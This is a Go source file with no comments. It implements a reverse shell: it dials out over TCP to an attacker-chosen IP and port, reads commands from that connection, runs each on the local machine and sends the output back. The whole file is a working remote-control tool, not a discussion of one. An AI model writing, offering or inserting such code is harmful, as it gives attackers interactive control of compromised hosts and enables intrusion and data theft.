package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

var (
	targetIP   string
	targetPort int
	target     net.IP
)

func main() {

	flag.StringVar(&targetIP, "targetIP", "127.0.0.1", "Target IP Address")
	flag.IntVar(&targetPort, "targetPort", 8080, "Target Port Number")
	flag.Parse()

	if target = net.ParseIP(targetIP); target == nil {
		fmt.Printf("Non IP Target: %q", targetIP)
		os.Exit(1)
	} else if target = target.To4(); target == nil {
		fmt.Printf("Non IPv4 Target: %q", targetIP)
		os.Exit(1)
	}

	conn, _ := net.Dial("tcp", targetIP+":"+strconv.Itoa(targetPort))

	for {
		command, _ := bufio.NewReader(conn).ReadString('\n')
		output, err := exec.Command(strings.TrimSuffix(command, "\n")).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}
		fmt.Fprintf(conn, "%s\n", output)
	}

}
